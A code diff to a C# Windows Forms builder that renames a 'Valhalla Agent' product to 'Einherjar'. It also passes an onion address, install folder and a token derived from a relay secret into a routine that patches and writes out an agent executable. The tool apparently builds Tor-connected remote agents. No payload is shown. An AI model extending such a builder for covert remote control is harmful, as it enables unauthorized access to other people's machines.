@@ -3926,7 +3926,7 @@ namespace Valhalla
                 Margin = Padding.Empty,
                 Text = relaySettings != null && !string.IsNullOrWhiteSpace(relaySettings.FolderName)
                     ? relaySettings.FolderName
-                    : "Valhalla",
+                    : "Einherjar",
                 Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
                 ForeColor = Color.White,
                 BackColor = Color.FromArgb(58, 58, 58),
@@ -4047,22 +4047,22 @@ namespace Valhalla
             }
             catch (Exception ex)
             {
-                MessageBox.Show(this, ex.Message, "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                MessageBox.Show(this, ex.Message, "Einherjar Build", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 return;
             }
 
             int    installDir  = _selectedInstallDir;
-            string folderName  = (_folderNameBox != null ? _folderNameBox.Text : null) ?? "Valhalla";
-            if (string.IsNullOrWhiteSpace(folderName)) folderName = "Valhalla";
+            string folderName  = (_folderNameBox != null ? _folderNameBox.Text : null) ?? "Einherjar";
+            if (string.IsNullOrWhiteSpace(folderName)) folderName = "Einherjar";
 
             // Show a Save File dialog so the operator chooses the output name and location.
             string outputPath;
             using (var sfd = new System.Windows.Forms.SaveFileDialog
             {
-                Title            = "Save Valhalla Agent",
+                Title            = "Save Einherjar",
                 Filter           = "Executable (*.exe)|*.exe",
                 DefaultExt       = "exe",
-                FileName         = "agent.exe",
+                FileName         = "einherjar.exe",
                 InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
             })
             {
@@ -4076,19 +4076,21 @@ namespace Valhalla
 
             try
             {
-                await Task.Run(() => AgentBuildService.PatchAndDeploy(onion, installDir, folderName, outputPath));
-
                 if (relaySettings == null) relaySettings = RelaySettingsStore.Load();
+                string relaySecret = relaySettings.AuthenticationSecret;
+                string agentToken = AgentBuildService.DeriveAgentToken(relaySecret);
+                await Task.Run(() => AgentBuildService.PatchAndDeploy(onion, installDir, folderName, agentToken, outputPath));
+
                 relaySettings.OnionAddress    = onion;
                 relaySettings.InstallDirectory = installDir;
                 relaySettings.FolderName       = folderName;
                 RelaySettingsStore.Save(relaySettings);
 
-                MessageBox.Show(this, "Build complete.", "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show(this, "Build complete.", "Einherjar Build", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             catch (Exception ex)
             {
-                MessageBox.Show(this, ex.Message, "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(this, ex.Message, "Einherjar Build", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
             finally
             {
